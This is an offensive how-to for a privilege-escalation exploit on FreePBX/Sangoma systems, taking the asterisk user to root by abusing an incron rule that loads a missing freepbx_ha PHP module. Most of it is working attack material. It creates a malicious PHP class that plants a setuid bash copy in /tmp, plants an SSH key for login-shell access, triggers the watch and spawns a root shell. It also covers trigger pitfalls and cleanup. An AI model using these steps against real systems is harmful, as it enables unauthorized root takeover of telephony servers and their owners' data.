# FreePBX incron Module Injection Privesc

## When to use

- Shell as `asterisk` user on a FreePBX/Sangoma system (CentOS/RHEL)
- `incrond` is running as root (check `ps aux | grep incron`)
- `/usr/local/asterisk/ha_trigger` exists and is writable by asterisk
- The `freepbx_ha` module directory does NOT exist under `/var/www/html/admin/modules/`
- `/var/www/html/admin/modules/` is owned by asterisk (default FreePBX install)

## Tags

- ATT&CK: T1068 (Exploitation for Privilege Escalation), T1546.004 (Event Triggered Execution)
- Platform: Linux (CentOS 7, RHEL with Sangoma/FreePBX)
- Services: FreePBX, incron, Asterisk
- Privileges: asterisk user -> root

## How it works

FreePBX ships with an incron rule that watches `/usr/local/asterisk/ha_trigger` for
`IN_CLOSE_WRITE` events. When triggered, incron runs `/usr/sbin/sysadmin_ha` as root.
That script includes PHP files from the `freepbx_ha` module directory:

```php
// /usr/sbin/sysadmin_ha
if (file_exists("/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php")) {
    require_once($i);
    $incron = new incron;
    $incron->rootTrigger();
}
```

The `freepbx_ha` module is a paid add-on that most installs don't have. The directory
doesn't exist, but `asterisk` owns the parent directory and can create it with a
malicious PHP class.

## Steps

### 1. Verify the setup

```bash
# Confirm incron is running and watching ha_trigger
ps aux | grep incron
cat /etc/incron.d/legacy | grep ha_trigger

# Confirm ha_trigger is writable
ls -la /usr/local/asterisk/ha_trigger

# Confirm freepbx_ha module does NOT exist
ls /var/www/html/admin/modules/freepbx_ha/ 2>&1
# Should return "No such file or directory"

# Confirm we own the parent
ls -la /var/www/html/admin/modules/ | head -2
```

### 2. Create the malicious module

```bash
mkdir -p /var/www/html/admin/modules/freepbx_ha/functions.inc/

cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << 'PHP'
<?php
class incron {
    public function rootTrigger() {
        exec('cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash');
    }
}
PHP
```

### 3. Trigger from a login shell (not a webshell)

**This is the critical step.** The incron watch does NOT fire from Apache/httpd
process context. You must trigger from an SSH session or equivalent login shell.

```bash
# Plant an SSH key via your current access (webshell, reverse shell, etc.)
mkdir -p ~/.ssh
echo 'ssh-ed25519 AAAA... your-key' > ~/.ssh/authorized_keys
chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys

# SSH in
ssh -i key asterisk@TARGET

# Trigger the incron watch
touch /usr/local/asterisk/ha_trigger
```

### 4. Get root

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root ...

/tmp/rootbash -p
# euid=0(root)
```

## Why the webshell trigger fails

Apache httpd workers run under a systemd cgroup (`httpd.service`). The incrond process
does not observe `IN_CLOSE_WRITE` events generated by processes in this cgroup. This
is likely caused by mount namespace isolation or audit subsystem interaction (laurel
is common on Sangoma boxes). The raw inotify syscalls succeed from the webshell context,
but incrond ignores the events.

Affected trigger methods (all fail from webshell):
- PHP `file_put_contents()`, `touch()`
- Bash `echo >`, `touch`, `dd`
- Compiled C with explicit `open()/write()/close()` syscalls
- `nohup` backgrounded scripts
- `at` scheduled jobs (inherits the httpd cgroup)

Working trigger methods:
- SSH login session
- Direct console access
- `cron` jobs (runs in its own cgroup)

## Cleanup

```bash
rm -rf /var/www/html/admin/modules/freepbx_ha/
rm -f /tmp/rootbash
```
